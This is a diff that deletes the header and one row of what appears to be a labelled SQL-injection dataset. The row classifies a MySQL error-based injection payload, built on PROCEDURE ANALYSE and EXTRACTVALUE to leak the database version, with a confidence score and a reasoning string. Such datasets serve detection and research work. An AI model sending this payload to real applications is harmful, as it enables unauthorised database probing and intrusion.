@@ -1,2 +1,0 @@
-id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
-40544,"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",error_based,mysql,0.75,Error-based signal detected: 'extractvalue' for mysql,4
